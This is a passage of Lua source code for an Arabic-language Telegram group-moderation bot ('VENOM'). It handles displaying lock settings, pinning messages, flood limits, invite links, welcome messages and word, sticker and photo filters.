elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد'    
else
lock_links = '✘'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '✓'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد'    
else
lock_cmds = '✘'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '✓'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد'    
else
lock_user = '✘'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '✓'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد'    
else
lock_hash = '✘'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '✓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد'    
else
lock_muse = '✘'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '✓'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد'    
else
lock_ved = '✘'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '✓'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد'    
else
lock_gif = '✘'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '✓'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد'    
else
lock_ste = '✘'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '✓'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد'    
else
lock_geam = '✘'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '✓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد'    
else
lock_vico = '✘'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '✓'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد'
else
lock_inlin = '✘'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '✓'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد'    
else
lock_fwd = '✘'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '✓'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد'    
else
lock_file = '✘'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '✓'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد'    
else
lock_self = '✘'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '✓'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد'    
else
lock_bots = '✘'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '✓'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد'    
else
lock_mark = '✘'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '✓'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد'    
else
lock_spam = '✘'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '✓'
else
rdmder = '✘'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '✓'
else
rdsudo = '✘'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '✓'
else
idgp = '✘'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '✓'
else
idph = '✘'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '✓'
else
setadd = '✘'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
VNOm = '✓'
else
VNOm = '✘'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '✓'
else
addme = '✘'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '✓'
else
sehuser = '✘'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '✓'
else
kickme = '✘'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n❲[🅢🅞🅞🅝](t.me/SOURCEVENOM)❳'..
'\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n 𖥔 اعدادات الجروب كتالي √↓'..
'\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n 𖥔  علامة ال {✓} تعني مفعل'..
'\n 𖥔  علامة ال {✘} تعني معطل'..
'\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n 𖥔  الروابط  ↚ { '..lock_links..
' }\n'..' 𖥔  المعرفات  ↚ { '..lock_user..
' }\n'..' 𖥔  التاك  ↚ { '..lock_hash..
' }\n'..' 𖥔  البوتات  ↚ { '..lock_bots..
' }\n'..' 𖥔  التوجيه  ↚ { '..lock_fwd..
' }\n'..' 𖥔  التثبيت  ↚ { '..lock_pin..
' }\n'..' 𖥔  الاشعارات  ↚ { '..lock_tagservr..
' }\n'..' 𖥔  الماركدون  ↚ { '..lock_mark..
' }\n'..' 𖥔  التعديل  ↚ { '..lock_edit..
' }\n'..' 𖥔  تعديل الميديا  ↚ { '..lock_edit_med..
' }\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n'..' 𖥔  الكلايش  ↚ { '..lock_spam..
' }\n'..' 𖥔  الكيبورد  ↚ { '..lock_inlin..
' }\n'..' 𖥔  الاغاني  ↚ { '..lock_vico..
' }\n'..' 𖥔  المتحركه  ↚ { '..lock_gif..
' }\n'..' 𖥔  الملفات  ↚ { '..lock_file..
' }\n'..' 𖥔  الدردشه  ↚ { '..lock_text..
' }\n'..' 𖥔   الفيديو  ↚ { '..lock_ved..
' }\n'..' 𖥔   الصور  ↚ { '..lock_photo..
' }\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n'..' 𖥔   الصوت  ↚ { '..lock_muse..
' }\n'..' 𖥔  الملصقات  ↚ { '..lock_ste..
' }\n'..' 𖥔  الجهات  ↚ { '..lock_phon..
' }\n'..' 𖥔  الدخول  ↚ { '..lock_join..
' }\n'..' 𖥔  الاضافه  ↚ { '..lock_add..
' }\n'..' 𖥔  السيلفي  ↚ { '..lock_self..
' }\n'..' 𖥔  الالعاب  ↚ { '..lock_geam..
' }\n'..' 𖥔  التكرار  ↚ { '..flood..
' }\n'..' 𖥔  الترحيب  ↚ { '..welcome..
' }\n'..' 𖥔  عدد التكرار  ↚ { '..NUM_MSG_MAX..
' }\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n 𖥔  علامة ال {✓} تعني مفعل'..
'\n 𖥔  علامة ال {✘} تعني معطل'..
'\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
'\n'..' 𖥔  امر صيح  ↚ { '..kickme..
' }\n'..' 𖥔  امر اطردني  ↚ { '..sehuser..
' }\n'..' 𖥔  امر منو ضافني  ↚ { '..addme..
' }\n'..' 𖥔  الردود  ↚ { '..rdmder..
' }\n'..' 𖥔  الردود العامه  ↚ { '..rdsudo..
' }\n'..' 𖥔  الايدي  ↚ { '..idgp..
' }\n'..' 𖥔  الايدي بالصوره  ↚ { '..idph..
' }\n'..' 𖥔  الرفع  ↚ { '..setadd..
' }\n'..' 𖥔  الحظر  ↚ { '..VNOm..' }\n\n 𖥔⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 قناة سورس فينوم↓\n [ ❲[𝐒ΘΘ𝐍](t.me/SOURCEVENOM)❳](t.me/SOURCEVENOM) \n'
send(msg.chat_id_, msg.id_,text)     
end
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," 𖥔 عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖥔 تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," 𖥔 انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," 𖥔 لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖥔 ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," 𖥔 عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء تثبيت الرساله")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," 𖥔 انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," 𖥔 لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖥔 ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," 𖥔 عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," 𖥔 انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," 𖥔 لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖥔 ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,' 𖥔 تم وضع عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,' 𖥔 تم وضع زمن التكرار ('..Num..')') 
end
if text == "تعطيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل الزخرفه')
database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل الزخرفه')
database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
end

if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://mohamed40.ml/apiso/zkrfa.php?ban='..URL.escape(TextZhrfa))
zx = JSON.decode(zh)
t = "𖥔قائمه الزخرفه \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
i = 0
for k,v in pairs(zx.results) do
i = i + 1
t = t..i.."↝ "..v.."\n"
end
send(msg.chat_id_, msg.id_, t..'━━━━\nاضغط علي الزخرفه ليتم نسخه\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺')
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," 𖥔 حسنآ ارسل اليه الرابط الان")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
if Mod(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ✔️ تم تفعيل الرابط") 
return false  
end
end
if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
if Mod(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ✘ تم تعطيل الرابط") 
return false end
end


---------------------
if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖥔 تم تفعيل الصوره") 
return false  
end
end
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' then
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖥔 تم تعطيل الصوره") 
return false end
end
if text == "تفعيل نسبه جمالي" or text == 'تفعيل جمالي' then
if Constructor(msg) then  
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖥔 تم تفعيل نسبه جمالك") 
return false  
end
end
if text == "تعطيل جمالي" or text == 'تعطيل نسبه جمالي' then
if Constructor(msg) then  
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖥔 تم تعطيل نسبه جمالك") 
return false end
end
if text == "الرابط" then 
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_) 
if not status_Link then 
send(msg.chat_id_, msg.id_,"الرابط معطل")  
return false   
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or database:get(bot_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Teext = '✧'..ta.title_..'\n'..linkgpp.result 
linkgp = '┉ ┉ ┉ ┉ ┉ ┉ ┉\n ['..ta.title_..']('..linkgpp.result..')'
local inline = {{{text = ta.title_, url=linkgpp.result}},} 
send_inline_key(msg.chat_id_,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,'✧لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end

if text == 'مسح الرابط' or text == 'مسح الرابط' then
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," 𖥔 تم مسح الرابط")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,' 𖥔 ارسل لي الصوره') 
return false
end
if text == "مسح الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖥔 تم ازالة صورة الجروب') 
end
return false  
end
if text == 'ضع وصف' or text == 'وضع وصف' then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الان الوصف')
end
return false  
end
if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = ' 𖥔 ارسل لي الترحيب الان'
tt = '\n 𖥔 تستطيع اضافة مايلي !\n 𖥔 دالة عرض الاسم  ↚{`name`}\n 𖥔 دالة عرض المعرف  ↚{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and Mod(msg) then 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = ' 𖥔 لم يتم تعيين ترحيب للكروب'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تفعيل ترحيب الجروب') 
return false  
end
if text == 'تعطيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖥔 تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," 𖥔 ارسل الكلمه لمنعها")  
database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," 𖥔 ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."VENOM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," 𖥔 تم منع الكلمه مع التحذير")  
database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."VENOM1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."VENOM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," 𖥔 ارسل الكلمه الان")  
database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء منعها")  
database:del(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."VENOM1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."VENOM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' 𖥔 تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' 𖥔 تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end

if text == "مسح قائمه المنع"and Manager(msg) then   
local list = database:smembers(bot_id.."VENOM1:List:Filter"..msg.chat_id_)  
